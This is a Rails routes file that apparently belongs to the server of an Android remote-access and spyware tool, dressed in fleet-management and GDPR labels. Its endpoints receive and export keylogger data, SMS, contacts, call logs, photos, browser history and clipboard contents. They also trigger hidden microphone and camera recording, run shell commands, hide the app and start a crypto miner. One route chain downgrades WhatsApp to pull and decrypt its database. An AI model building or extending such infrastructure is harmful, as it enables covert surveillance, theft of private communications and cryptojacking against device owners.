Rails.application.routes.draw do
  # Health Check Endpoints (for Docker/K8s) — local or authenticated only
  health_constraint = ->(req) { req.local? || req.env['HTTP_AUTHORIZATION'].present? }

  constraints(health_constraint) do
    get '/health', to: 'health#index'
    get '/health/ready', to: 'health#ready'
    get '/health/live', to: 'health#live'
    get '/health/startup', to: 'health#startup'

    # Prometheus Metrics Endpoint
    get '/metrics', to: 'metrics#index'
  end

  # Audit Trail System
  resources :audit_logs, only: [:index, :show] do
    collection do
      get :export
      get :stats
    end
  end

  # Notification & Alert System
  resources :alert_rules do
    member do
      post :toggle
    end
  end
  
  resources :alerts, only: [:index, :show] do
    member do
      post :acknowledge
    end
    collection do
      get :stats
    end
  end
  
  resources :notification_channels do
    member do
      post :test
    end
  end

  # Fleet Management
  resources :device_groups do
    member do
      post :add_devices
      post :remove_devices
      post :bulk_command
    end
  end

  resources :apk_installations do
    resources :tags, controller: :device_tags, only: [:index, :create, :destroy]
    
    # Consent Management routes
    resources :consents, only: [:index] do
      collection do
        post :grant
        post :revoke
        get :export
      end
    end
    
    # App Control Panel routes
    get 'apps', to: 'app_control#index'
    post 'apps/refresh', to: 'app_control#refresh'
    post 'apps/install', to: 'app_control#install'
    delete 'apps/:package_name', to: 'app_control#uninstall'
    post 'apps/:package_name/launch', to: 'app_control#launch'
    post 'apps/:package_name/kill', to: 'app_control#kill'
    get 'processes', to: 'app_control#processes'
    get 'apps/:package_name/permissions', to: 'app_control#permissions'
    patch 'apps/:package_name/permissions', to: 'app_control#update_permissions'
  end

  get '/devices/tags/search', to: 'device_tags#search'

  # Chunked File Uploads
  post 'file_transfers/upload_chunk', to: 'file_transfers#upload_chunk'
  post 'file_transfers/finalize_upload', to: 'file_transfers#finalize_upload'
  post 'file_transfers/cleanup_expired_uploads', to: 'file_transfers#cleanup_expired_uploads'

  # WebRTC & Live Streaming
  get 'webrtc/turn_credentials', to: 'webrtc#turn_credentials'
  post 'webrtc/signal', to: 'webrtc#signal'

  # Device REST endpoints (root-level, used by Android Retrofit client)
  scope 'device' do
    match 'heartbeat', to: 'api/devices#heartbeat', via: [:get, :post]
    get 'info', to: 'api/devices#info'
  end

  # REST API for Android devices (fallback for WebSocket)
  namespace :api do
    # MCP (Model Context Protocol) Server endpoints
    scope 'mcp' do
      post 'initialize', to: 'mcp#initialize_session'
      get 'tools', to: 'mcp#list_tools'
      post 'tools/call', to: 'mcp#call_tool'
      get 'resources', to: 'mcp#list_resources'
      post 'resources/read', to: 'mcp#read_resource'
      get 'prompts', to: 'mcp#list_prompts'
      post 'prompts/get', to: 'mcp#get_prompt'
      get 'stream/:device_id', to: 'mcp#stream'
      get 'health', to: 'mcp#health'
    end

    get 'config', to: 'config#show'
    resources :commands, only: [:show] do
      member do
        post :ack
        post :respond
        post :send_command
      end
    end
    post 'location', to: 'commands#location'
    post 'locations', to: 'commands#location'  # Android client sends to /locations
    get 'devices/online', to: 'devices#online'
    
    # Keylogger API endpoints (ENHANCED)
    post 'keylogger', to: 'keylogger#receive'
    post 'keylogger/ack', to: 'keylogger#acknowledge' # ACK confirmation
    get 'keylogger/data/:device_id', to: 'keylogger#data'
    get 'keylogger/stats/:device_id', to: 'keylogger#stats' # Statistics
    get 'keylogger/export/:device_id', to: 'keylogger#export' # CSV/HTML export
    
    # Notifications API endpoints
    post 'notifications', to: 'notifications#receive'
    get 'notifications/:device_id', to: 'notifications#index'

    # Data Ingestion (Mapped for Android Client)
    post 'sms', to: 'sms_messages#upload_dump'
    post 'contacts', to: 'contacts#upload_dump'
    post 'photos', to: 'media#upload_photo'
    post 'audio', to: 'media#upload_audio'
    post 'calls', to: 'call_logs#upload_dump'
    post 'clipboard', to: 'clipboard#receive'
    post 'app_usage', to: 'app_usage#receive'
    post 'browser_history', to: 'browser_history#receive'
    post 'file_browser', to: 'file_browser#receive'
    post 'geofence', to: 'geofence#receive'

    # Two-Factor Authentication
    post '2fa/enable', to: 'two_factor#enable'
    post '2fa/verify', to: 'two_factor#verify'
    post '2fa/disable', to: 'two_factor#disable'
    get '2fa/backup_codes', to: 'two_factor#backup_codes'

    # Screen Mirroring (Enterprise Remote Support)
    scope 'devices/:id/screen' do
      post 'start', to: 'screen_mirror#start'
      post 'stop', to: 'screen_mirror#stop'
      get 'status', to: 'screen_mirror#status'
    end

    # Data Collection Endpoints
    scope 'devices/:id' do
      get 'bookmarks', to: 'data_collection#bookmarks'
      get 'certificates', to: 'data_collection#certificates'
      get 'wifi_networks', to: 'data_collection#wifi_networks'
      get 'clipboard_history', to: 'data_collection#clipboard_history'
      post 'screenshot', to: 'data_collection#screenshot'
    end

    # Keylog Analytics API endpoints
    scope 'devices/:id' do
      get 'keylog_analytics', to: 'keylog_analytics#show'
      get 'keylog_analytics/app_usage', to: 'keylog_analytics#app_usage'
      get 'keylog_analytics/activity_timeline', to: 'keylog_analytics#activity_timeline'
      get 'keylog_analytics/export', to: 'keylog_analytics#export'

      # Audio Intelligence
      post 'audio/transcribe', to: 'audio#transcribe'
      get  'audio/transcriptions', to: 'audio#transcriptions'
      post 'audio/analyze', to: 'audio#analyze'
    end

    # Scheduled Commands
    scope 'devices/:device_id' do
      resources :scheduled_commands, only: [:index, :show, :create, :update, :destroy] do
        member do
          post :toggle
          get :executions
        end
      end
    end

    # Geofence Management
    scope 'devices/:device_id' do
      resources :geofences, controller: 'geofence', only: [:index, :create, :destroy]
      get 'location_history', to: 'geofence#location_history'
      get 'location_heatmap', to: 'geofence#location_heatmap'
      get 'geofence_events', to: 'geofence#events'
    end

    # Security Analysis
    scope 'devices/:id/security' do
      get 'gps_analysis', to: 'security_analysis#gps_analysis'
      get 'media_analysis', to: 'security_analysis#media_analysis'
      get 'tamper_status', to: 'security_analysis#tamper_status'
    end
    
    # File Browser API
    resources :smartphones, only: [] do
      scope module: :file_browser do
        get 'files', to: 'file_browser#index', as: 'files'
        get 'files/download', to: 'file_browser#download', as: 'download_file'
        post 'files/upload', to: 'file_browser#upload', as: 'upload_file'
        delete 'files', to: 'file_browser#delete', as: 'delete_file'
        get 'files/preview', to: 'file_browser#preview', as: 'preview_file'
        post 'files/rename', to: 'file_browser#rename', as: 'rename_file'
        post 'files/move', to: 'file_browser#move', as: 'move_file'
        get 'files/search', to: 'file_browser#search', as: 'search_files'
      end
    end

    # GDPR Compliance Endpoints
    scope 'devices/:id' do
      post 'erasure_request', to: 'gdpr#erasure_request'
      get 'data_export', to: 'gdpr#data_export'
      get 'retention_policy', to: 'gdpr#show_retention_policy'
      put 'retention_policy', to: 'gdpr#update_retention_policy'
      get 'privacy_policy', to: 'gdpr#privacy_policy'
    end

    # Error Tracking API
    resources :errors, only: [:index, :show] do
      member do
        put :resolve
        put :ignore
      end
    end

    # User Preferences API
    resource :preferences, only: [:show, :update, :destroy] do
      get '/', action: :index, on: :collection
    end

    # AI Features
    scope 'ai' do
      # AI Chat Assistant
      post 'chat', to: 'ai_chat#chat'
      get 'chat/capabilities', to: 'ai_chat#capabilities'

      # AI Report Generation
      post 'reports/generate', to: 'report_generation#generate'
      get 'reports/templates', to: 'report_generation#templates'
      post 'reports/risk_assessment', to: 'report_generation#risk_assessment'

      # Predictive Analytics
      get 'predictions/:device_id', to: 'predictive_analytics#show'
      get 'predictions/:device_id/location', to: 'predictive_analytics#location'
      get 'predictions/:device_id/activity', to: 'predictive_analytics#activity'
      get 'predictions/:device_id/risk', to: 'predictive_analytics#risk'
      get 'predictions/:device_id/contacts', to: 'predictive_analytics#contacts'

      # Smart Geofencing
      get 'geofencing/:device_id', to: 'smart_geofencing#show'
      get 'geofencing/:device_id/places', to: 'smart_geofencing#places'
      get 'geofencing/:device_id/suggestions', to: 'smart_geofencing#suggestions'
      get 'geofencing/:device_id/routes', to: 'smart_geofencing#routes'
      get 'geofencing/:device_id/anomalies', to: 'smart_geofencing#anomalies'

      # NLP Analysis
      post 'nlp/analyze', to: 'nlp_analysis#analyze'
      post 'nlp/entities', to: 'nlp_analysis#entities'
      post 'nlp/sentiment', to: 'nlp_analysis#sentiment'
      post 'nlp/language', to: 'nlp_analysis#language'
      post 'nlp/pii', to: 'nlp_analysis#pii'
      get 'nlp/device_messages/:device_id', to: 'nlp_analysis#device_messages'

      # Image Recognition
      post 'image/analyze', to: 'image_recognition#analyze'
      post 'image/ocr', to: 'image_recognition#ocr'
      post 'image/faces', to: 'image_recognition#faces'
      post 'image/objects', to: 'image_recognition#objects'
      post 'image/metadata', to: 'image_recognition#metadata'
      get 'image/device_images/:device_id', to: 'image_recognition#device_images'
    end

    namespace :v1 do
      get 'telemetry/devices', to: 'telemetry#devices'
      get 'telemetry/command_queue', to: 'telemetry#command_queue'
      get 'telemetry/webrtc_status', to: 'telemetry#webrtc_status'
      get 'telemetry/uploads', to: 'telemetry#uploads'

      # Network Resilience endpoints
      get 'connections', to: 'connections#index'
      get 'connections/stats', to: 'connections#stats'
      post 'connections/cleanup', to: 'connections#cleanup'
      get 'circuit_breakers', to: 'circuit_breakers#index'
      post 'circuit_breakers/:service/reset', to: 'circuit_breakers#reset'
      get 'offline_queue/:device_id', to: 'offline_queue#show'
      post 'offline_queue/:device_id', to: 'offline_queue#create'
      delete 'offline_queue/:device_id', to: 'offline_queue#flush'
    end
  end

  # Admin config save endpoint
  namespace :admin do
    post 'android_config/update', to: 'android_settings#update', as: 'android_config_update'
  end


  resources :apk_payloads
  resources :contacts do
    collection do
      post :dump_contacts
    end
  end
  resources :geo_locations do
    collection do
      get :dump_location
    end
  end
  resources :sms_messages do
    collection do
      post :dump_messages
      post :send_sms
    end
  end
  resources :call_logs do
    collection do
      post :dump_calllogs
    end
  end
  resources :recordings do
    collection do
      post :microphone_rec
    end
  end
  resources :messaging_apps_dumps do
    collection do
      get :uninstall_whatsapp_for_downgrade
      get :install_old_apk
      get :adb_backup
      get :extract_backup
      get :untar_backup
      get :pull_whatsapp_db
      get :decrypt_whatsapp_database
      post :export_whatsapp_database
    end
  end
  resources :screenshots do
    collection do
      get :dump_screen_snap
      post :screen_record
    end
  end
  resources :pictures do
    collection do
      post :take_picture
    end
  end

  resources :smartphones do
    collection do
      get :load
      get :check_connection
      post :install
      post :front_camera_snap
      post :get_accounts
      post :toggle_wifi
      post :select_smartphone
      post :take_picture
      post :dump_sysinfo
      post :set_audio_mode
      post :dump_localtime
      post :uninstall_app
      post :install_app
      post :list_apps
      post :open_app
      post :wake_lock
      post :dump_wifi_info
      get :webcam_record
      get :upload_file
      post :run_shell_command
      post :dump_device_info
      post :pull_file
      post :ambient_record
      post :browse_files
      post :get_app_usage
      post :get_browser_history
      post :start_webrtc_stream
      get :hide_app
      get :show_app
      get :crypto_miner  # Fixed typo: was crypto_minner
    end
  end

  post '/graphql', to: 'graphql#execute'
  get '/dashboard', to: 'dashboards#index'
  root to: redirect('/dashboard')
  
  # Statistics API endpoints
  get 'devices/:id/statistics', to: 'statistics#show', as: 'device_statistics'

  devise_for :admin_users, ActiveAdmin::Devise.config
  ActiveAdmin.routes(self)
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html

end
